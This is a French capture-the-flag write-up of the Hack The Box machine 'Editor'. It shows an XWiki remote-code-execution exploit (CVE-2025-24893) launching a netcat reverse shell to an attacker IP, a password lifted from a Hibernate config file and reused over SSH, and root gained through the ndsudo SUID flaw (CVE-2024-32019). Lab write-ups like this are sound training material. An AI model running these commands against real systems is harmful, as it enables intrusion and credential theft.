+++
draft = true
date = '2025-10-07T15:00:00+02:00'
title = "Hack The Box Editor"
description = "Write Up du challenge Editor"
authors = "Wanako"
tags = ["Hack The Box"]
categories = ["Machine", "Hack The Box", "CVE"]
+++

# Writeup - Editor

## Reconnaissance

La machine expose un site XWiki en version 1.10.8, vulnérable à une RCE (CVE-2025-24893).

---

## Initial Foothold - RCE XWiki

### Exploitation

On utilise l'exploit disponible sur GitHub :

**Terminal 1 - Exploitation**
```bash
python CVE-2025-24893.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.14.115 9001 -e /bin/bash'

[*] Attacking http://editor.htb:8080
[*] Injecting the payload...
[*] Command executed
```

**Terminal 2 - Reverse Shell**
```bash
nc -lvp 9001

Listening on 0.0.0.0 9001
Connection received on editor.htb 52616
whoami
xwiki
```

### Stabilisation du shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Pivot vers l'utilisateur Oliver

### Énumération

On constate la présence d'un utilisateur `oliver` dans `/home`.

### Récupération des credentials

XWiki utilise un fichier de configuration Hibernate contenant les credentials de la base de données :

```bash
find / -name "hibernate.cfg.xml" 2>/dev/null
# /etc/xwiki/hibernate.cfg.xml

cat /etc/xwiki/hibernate.cfg.xml | grep password
# <property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

**Credentials trouvés :** `oliver:theEd1t0rTeam99`

### Connexion SSH

```bash
ssh oliver@editor.htb
# ✅ Connexion réussie
```

---

## Privilege Escalation vers Root

### Énumération des groupes

```bash
id
# uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

Oliver appartient au groupe **netdata** (service de monitoring système).

### Recherche de binaires SUID

```bash
find / -type f -perm -4000 -user root 2>/dev/null
```

**Résultats intéressants :**
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
...
```

### Exploitation de ndsudo (CVE-2024-32019)

Le binaire `ndsudo` est vulnérable à une escalade de privilèges.

**Exploit disponible :** https://github.com/AzureADTrent/CVE-2024-32019-POC

```bash
# Exploitation selon le POC
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo [commande root]
```

**Résultat :** Shell root obtenu ✅

---

## Flags

```bash
cat /home/oliver/user.txt
cat /root/root.txt
```

---

## Résumé de la Kill Chain

1. **RCE XWiki** (CVE-2025-24893) → Shell `xwiki`
2. **Credentials dans hibernate.cfg.xml** → User `oliver`
3. **ndsudo SUID** (CVE-2024-32019) → Root

**GG ! 🎯**
